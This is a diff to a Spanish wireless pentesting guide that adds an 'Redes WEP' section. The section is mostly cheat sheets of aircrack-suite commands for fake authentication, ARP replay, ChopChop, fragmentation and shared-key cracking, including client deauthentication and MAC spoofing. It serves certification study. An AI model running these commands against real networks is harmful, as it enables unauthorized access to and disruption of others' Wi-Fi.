@@ -65,7 +65,14 @@
                 * [Uso de hcxpcaptool](#uso-de-hcxpcaptool)
         * [Ataques por WPS](#ataques-por-wps)
             * [Uso de Wifimosys](#uso-de-wifimosys)
-        * [Redes WPA Ocultas](#redes-wpa-ocultas)           
+        * [Redes WPA Ocultas](#redes-wpa-ocultas)       
+    * [Redes WEP](#redes-wep)
+        * [Fake Authentication Attack](#fake-authentication-attack) 
+        * [ARP Replay Attack](#arp-replay-attack) 
+        * [Chop Chop Attack](#chop-chop-attack) 
+        * [Fragmentation Attack](#fragmentation-attack) 
+        * [SKA Type Cracking](#ska-type-cracking) 
+
             
        
 
@@ -3969,6 +3976,84 @@ De esta forma, podemos ser capaces de extraer el **ESSID** de la red tras aplica
 de-autenticación sobre una de las estaciones presentes. ¿Pero qué es lo bueno de esto?, que ni nosotros
 tenemos que hacer el trabajo. Una vez la propia suite de **aircrack** detecta estos paquetes Probe, los parsea
 en busca del **ESSID** de la red oculta. En caso de obtenerla, sustituye el campo `<length: 0>` por el **ESSID** descubierto, automáticamente.
+
+## Redes WEP
+
+**IMPORTANTE: En este punto, no entraré tanto al detalle como en las redes de protocolo WPA. ¿Por qué?, porque
+ya para eso tienes todo el material necesario que te entregan tras cursar la certificación, que se orienta a
+vulnerar el protocolo WEP. Todo lo visto hasta ahora, han sido técnicas que os quería compartir sobre el
+protocolo WPA/WPA2, ya que es el más usado a día de hoy y el que con más frecuencia nos vamos a encontrar en nuestro entorno.**
+
+Aún así, dejo un **Cheat Sheet** para cada uno de los casos.
+
+### Fake Authentication Attack
+
+```bash
+s4vitar@parrot:~# airmon-ng start wlan0
+s4vitar@parrot:~# airodump-ng –c <Canal_AP> --bssid <BSSID> -w <nombreCaptura> wlan0mon
+# Identificamos nuestra MAC
+s4vitar@parrot:~# macchanger --show wlan0mon
+s4vitar@parrot:~# aireplay-ng -1 0 -a <BSSID> -h <nuestraMAC> -e <ESSID> wlan0mon
+s4vitar@parrot:~# aireplay-ng -2 –p 0841 –c FF:FF:FF:FF:FF:FF –b <BSSID> -h <nuestraMAC> wlan0mon
+s4vitar@parrot:~# aircrack-ng –b <BSSID> <archivoPCAP>
+```
+
+### ARP Replay Attack
+
+```bash
+s4vitar@parrot:~# airmon-ng start wlan0
+s4vitar@parrot:~# airodump-ng –c <Canal_AP> --bssid <BSSID> -w <nombreCaptura> wlan0mon
+# Identificamos nuestra MAC
+s4vitar@parrot:~# macchanger --show wlan0mon
+s4vitar@parrot:~# aireplay-ng -3 –x 1000 –n 1000 –b <BSSID> -h <nuestraMAC> wlan0mon
+s4vitar@parrot:~# aircrack-ng –b <BSSID> <archivoPCAP>
+```
+
+### Chop Chop Attack
+
+```bash
+s4vitar@parrot:~# airmon-ng start wlan0
+s4vitar@parrot:~# airodump-ng –c <Canal_AP> --bssid <BSSID> -w <nombreArchivo> wlan0mon
+# Identificamos nuestra MAC
+s4vitar@parrot:~# macchanger --show wlan0mon
+s4vitar@parrot:~# aireplay-ng -1 0 –e <ESSID> -a <BSSID> -h <nuestraMAC> wlan0mon
+s4vitar@parrot:~# aireplay-ng -4 –b <BSSID> -h <nuestraMAC> wlan0mon
+ # Presionamos ‘y’ ;
+s4vitar@parrot:~# packetforge-ng -0 –a <BSSID> -h <nuestraMAC> -k <SourceIP> -l <DestinationIP> -y <XOR_PacketFile> -w <FileName2>
+s4vitar@parrot:~# aireplay-ng -2 –r <FileName2> wlan0mon
+s4vitar@parrot:~# aircrack-ng <archivoPCAP>
+```
+
+### Fragmentation Attack
+
+```bash
+s4vitar@parrot:~# airmon-ng start wlan0
+s4vitar@parrot:~# airodump-ng –c <Canal_AP> --bssid <BSSID> -w <nombreArchivo> wlan0mon
+# Identificamos nuestra MAC
+s4vitar@parrot:~# macchanger --show wlan0mon
+s4vitar@parrot:~# aireplay-ng -1 0 –e <ESSID> -a <BSSID> -h <nuestraMAC> wlan0mon
+s4vitar@parrot:~# aireplay-ng -5 –b<BSSID> -h <nuestraMAC > wlan0mon
+# Presionamos ‘y’ ;
+s4vitar@parrot:~# packetforge-ng -0 –a <BSSID> -h <nuestraMAC> -k <SourceIP> -l <DestinationIP> -y <XOR_PacketFile> -w <FileName2>
+s4vitar@parrot:~# aireplay-ng -2 –r <FileName2> wlan0mon
+s4vitar@parrot:~# aircrack-ng <archivoPCAP>
+```
+
+### SKA Type Cracking
+
+```bash
+s4vitar@parrot:~# airmon-ng start wlan0
+s4vitar@parrot:~# airodump-ng –c <Canal_AP> --bssid <BSSID> -w <nombreArchivo> wlan0mon
+s4vitar@parrot:~# aireplay-ng -0 10 –a <BSSID> -c <macVictima> wlan0mon
+s4vitar@parrot:~# ifconfig wlan0mon down
+s4vitar@parrot:~# macchanger –-mac <macVictima> wlan0mon
+s4vitar@parrot:~# ifconfig wlan0mon up
+s4vitar@parrot:~# aireplay-ng -3 –b <BSSID> -h <macFalsa> wlan0mon
+s4vitar@parrot:~# aireplay-ng –-deauth 1 –a <BSSID> -h <macFalsa> wlan0mon
+s4vitar@parrot:~# aircrack-ng <archivoPCAP>
+```
+
+
 
 
 
